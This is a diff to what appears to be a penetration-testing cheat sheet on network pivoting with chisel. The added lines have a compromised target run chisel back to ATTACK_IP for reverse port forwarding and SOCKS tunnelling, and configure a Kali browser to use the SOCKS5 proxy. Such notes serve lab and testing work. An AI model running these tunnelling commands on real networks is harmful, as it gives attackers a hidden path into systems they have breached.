@@ -8,6 +8,20 @@
 
  - Target: ./chisel client ATTACK_IP:LISTEN_PORT R:SOCKS &
 
+ - Target: ./chisel client ATTACK_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT
+
+ - Target: ./chisel server -p TARGET_PORT --socks5
+
+### Then open the web browser in Kali and configure the proxy settings.
+
+#### 1) Go to "Manual Proxy configuration"
+
+#### 2) On "SOCKS Host", add 127.0.0.1 on port 1080 and click the SOCKS5 radio button
+
+#### 3) On "No proxy for", add 127.0.0.1
+
+#### 4) On browser, connect to our target IP
+
 ### Forward SOCKS proxy
 
  - Target: ./chisel server -p LISTEN_PORT --socks5
